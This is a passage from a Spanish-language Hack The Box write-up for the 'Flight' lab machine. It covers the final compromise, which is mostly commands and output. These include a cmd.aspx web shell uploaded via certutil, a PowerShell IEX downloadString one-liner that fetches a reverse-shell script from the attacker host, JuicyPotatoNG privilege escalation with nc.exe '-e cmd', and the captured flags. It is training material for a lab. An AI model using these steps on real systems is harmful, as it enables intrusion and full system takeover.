  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\inetpub\development> 
```

Vamos a usar una `cmd.aspx` para ganar acceso podemos usar el del `Seclists`

```bash
❯ cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .
```

Vamos a subirlo ala maquina victima

```bash
certutil.exe -urlcache -f -split http://10.10.14.86/cmd.aspx
```

Funciona

![](/assets/images/htb-writeup-flight/web6.png)

Nos podemos en escucha con `rlwrap` para ganar acceso 

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Ejecutamos este comando para ganar acceso en el **cmd.aspx** vamos a reutilizar el script `sh.ps1`

```bash
cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.86/sh.ps1')
``` 

![](/assets/images/htb-writeup-flight/web7.png)

Ganamos acceso 

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.86] from (UNKNOWN) [10.10.11.187] 55818
Windows PowerShell running as user G0$ on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 

```

## Escalada de privilegios

Como el **SeImpersonatePrivilege** esta en enable podemos usar el `JuicyPotato` para escalar privilegios

<https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1>

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```

```bash
❯ unzip JuicyPotatoNG.zip
Archive:  JuicyPotatoNG.zip
  inflating: JuicyPotatoNG.exe   
```

Vamos a subirlo a la maquina victima

```bash
cd C:\temp
certutil.exe -urlcache -f -split http://10.10.14.86/JuicyPotatoNG.exe
****  Online  ****
  000000  ...
  025800
CertUtil: -URLCache command completed successfully.
PS C:\temp> 
```

Ahora tambien necesitamos el `netcat` podemos usar el que trai **Seclists**

```bash
❯ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
```

Lo subimos ala maquina victima

```bash
certutil.exe -urlcache -f -split http://10.10.14.86/nc.exe
****  Online  ****
  0000  ...
  6e00
CertUtil: -URLCache command completed successfully.
PS C:\temp> 
```

Ahora nos pondremos en escucha para ganar accesos como el usuario `nt authority\system 

```bash
./JuicyPotatoNG.exe -t * -p "C:\temp\nc.exe" -a '10.10.14.86 443 -e cmd'
```

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.86] from (UNKNOWN) [10.10.11.187] 55848
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

C:\>


```

## Root flag 

```bash
 Directory of C:\Users\Administrator\Desktop

09/22/2022  01:48 PM    <DIR>          .
09/22/2022  01:48 PM    <DIR>          ..
05/05/2023  05:38 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,735,803,392 bytes free

type root.txt
type root.txt
7331258631d8c7440a99b334890f914c

C:\Users\Administrator\Desktop>
```

## User.txt 

```bash
dir /r /s user.txt
 Volume in drive C has no label.
 Volume Serial Number is 1DF4-493D

 Directory of C:\Documents and Settings\C.Bum\Desktop

05/05/2023  05:38 AM                34 user.txt
               1 File(s)             34 bytes

 Directory of C:\Users\C.Bum\Desktop

05/05/2023  05:38 AM                34 user.txt
               1 File(s)             34 bytes

     Total Files Listed:
               2 File(s)             68 bytes
               0 Dir(s)   4,735,803,392 bytes free

C:\>

type C:\Users\C.Bum\Desktop\user.txt
type C:\Users\C.Bum\Desktop\user.txt
a39c9d5f10510d2133ed1b2ed5dda547

C:\>
```

![](/assets/images/htb-writeup-flight/ultima.png)

